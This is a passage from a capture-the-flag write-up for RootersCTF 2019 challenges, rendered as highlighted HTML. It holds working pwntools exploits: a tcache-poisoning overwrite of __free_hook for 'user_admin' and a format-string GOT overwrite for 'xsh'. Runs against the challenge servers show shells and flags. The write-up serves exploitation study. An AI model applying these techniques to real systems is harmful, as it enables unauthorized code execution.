+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Saving'</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">2</span><span class="p">][</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3e82a0</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'__free_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+
+<span class="c1"># Tcache poisoning attack
+</span><span class="n">free</span><span class="p">()</span>
+<span class="n">free</span><span class="p">()</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">),</span> <span class="mi">15</span><span class="p">)</span>
+<span class="n">message</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+<span class="n">message</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+<span class="n">free</span><span class="p">()</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-re-challenges/rooters-2019/user_admin<span class="nv">$ </span>./exploit.py REMOTE
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/rooters-2019/user_admin/vuln'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/rooters-2019/user_admin/libc.so.6'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span class="o">[</span>+] Opening connection to 34.69.116.108 on port 3333: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leak: 0x7f2f8592d2a0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc base: 0x7f2f85545000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> system: 0x7f2f85594440
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> __free_hook: 0x7f2f859328e8
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+
+Message recieved:
+@DY<span class="se">\x</span>85/<span class="se">\x</span>7f
+
+Saving it <span class="k">for </span>admin to see!
+
+<span class="c">### USER ADMINISTRATION ###</span>
+
+0<span class="o">)</span> Create user
+1<span class="o">)</span> Edit user name
+2<span class="o">)</span> Delete user
+3<span class="o">)</span> Send admin a message
+4<span class="o">)</span> <span class="nb">exit
+</span>Enter your choice: <span class="nv">$ </span><span class="nb">ls
+</span>bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+<span class="nv">$ </span><span class="nb">cat</span> /home/<span class="k">*</span>/flag.txt
+rooters<span class="o">{</span>1_d0n7_f33l_g00d_mR_Pwn34<span class="o">}</span>ctf
+<span class="nv">$ </span> 
+</code></pre></div></div>
+
+<h1 id="xsh">xsh</h1>
+
+<p>This challenge originally had Full RELRO set. I was almost finished solving it but then the author re-released the challenge with Partial RELRO, which made it much easier to solve.</p>
+
+<h3 id="challenge-3"><strong>Challenge</strong></h3>
+
+<ul>
+  <li><strong>Category:</strong> pwn</li>
+  <li><strong>Points:</strong> 464</li>
+  <li><strong>Solves:</strong> 31</li>
+</ul>
+
+<blockquote>
+  <p>xsh is an sh-compatible command language interpreter that executes commands read from the standard input or from a file. xsh also incorporates useful features from the Korn and C shells (ksh and csh).</p>
+
+  <p>nc 35.192.206.226 5555</p>
+</blockquote>
+
+<h3 id="solution-3"><strong>Solution</strong></h3>
+
+<p>The binary had all mitigations except Full RELRO:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-re-challenges/rooters-2019/xsh<span class="nv">$ </span>checksec ./xsh
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/rooters-2019/xsh/xsh'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre></div></div>
+
+<p>The xsh shell only provided an <code class="highlighter-rouge">ls</code> command, an <code class="highlighter-rouge">echo</code> command, and a <code class="highlighter-rouge">zooo</code> command. The <code class="highlighter-rouge">zooo</code> command was a troll, it just printed out a poem. The <code class="highlighter-rouge">ls</code> command just did a normal <code class="highlighter-rouge">ls -la</code>. The <code class="highlighter-rouge">echo</code> command had a format string vulnerability.</p>
+
+<p>After the first four bytes of our command is compared to ‘echo’, if its true, then the following code takes place:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">cmd</span><span class="p">]</span>
+<span class="n">add</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">5</span>
+<span class="n">sub</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">0</span><span class="n">Ch</span>
+<span class="n">push</span>    <span class="n">eax</span>             <span class="p">;</span> <span class="n">format</span>
+<span class="n">call</span>    <span class="n">_printf</span>
+<span class="n">add</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">10</span><span class="n">h</span>
+<span class="n">jmp</span>     <span class="n">loc_1357</span>
+</code></pre></div></div>
+
+<p>Easy format string vulnerability.</p>
+
+<p>I found out that we can leak the PIE base by doing the following:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Get base address of binary
+</span><span class="n">leak</span> <span class="o">=</span> <span class="n">execute</span><span class="p">(</span><span class="s">'echo 0x</span><span class="si">%3</span><span class="s">$x'</span><span class="p">)[:</span><span class="mi">10</span><span class="p">]</span>
+<span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1249</span>
+<span class="n">strncmp_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'strncmp'</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'PIE base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'strncmp_got: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">strncmp_got</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Then I chose to use the format string vulnerability to write the address of <code class="highlighter-rouge">system</code> into <code class="highlighter-rouge">strncmp</code>’s GOT address. This way, whenever we type a command, when <code class="highlighter-rouge">strncmp(cmd, ...)</code> gets called, it will actually call <code class="highlighter-rouge">system(cmd)</code>.</p>
+
+<p>You might have to run the exploit a couple times remotely to get it to work. It works 100% locally.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./xsh'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="s">'./xsh'</span><span class="p">)</span>
+        <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s">'35.192.206.226'</span><span class="p">,</span> <span class="mi">5555</span><span class="p">)</span>
+        <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-remote.so.6'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'$'</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+
+<span class="c1"># Get base address of binary
+</span><span class="n">leak</span> <span class="o">=</span> <span class="n">execute</span><span class="p">(</span><span class="s">'echo 0x</span><span class="si">%3</span><span class="s">$x'</span><span class="p">)[:</span><span class="mi">10</span><span class="p">]</span>
+<span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1249</span>
+<span class="n">strncmp_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'strncmp'</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'PIE base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'strncmp_got: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">strncmp_got</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+
+<span class="c1"># Prepare to write system to strncmp_got
+# Calculate each half of the address
+# This is to prevent the exploit from taking way too long to write a huge address
+</span><span class="n">first</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">'0x'</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">second</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="c1"># Do the format string overwrite
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'echo'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">strncmp_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">strncmp_got</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">'</span><span class="si">%</span><span class="s">{}c</span><span class="si">%24</span><span class="s">$n</span><span class="si">%</span><span class="s">{}c</span><span class="si">%25</span><span class="s">$n'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">first</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span> <span class="n">second</span><span class="o">-</span><span class="n">first</span><span class="p">)</span>
+<span class="n">execute</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Execute /bin/sh for shell
+</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>
+
+<span class="c1"># When strncmp('/bin/sh') gets called, it will call system('/bin/sh')
+</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-re-challenges/rooters-2019/xsh<span class="nv">$ </span>./exploit.py REMOTE
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/rooters-2019/xsh/xsh'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/rooters-2019/xsh/libc.so.6'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span class="o">[</span>+] Opening connection to 35.192.206.226 on port 5555: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> PIE base: 0x565a4000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> strncmp_got: 0x565a8038
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> system: 0x565a5090
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nv">$ </span><span class="nb">ls
+</span>flag.txt
+vuln
+<span class="nv">$ </span><span class="nb">cat </span>flag.txt
+rooters<span class="o">{</span>ep1c_xsh_esc4p3<span class="o">}</span>ctf
+<span class="err">$</span>
+</code></pre></div></div>
+:ET
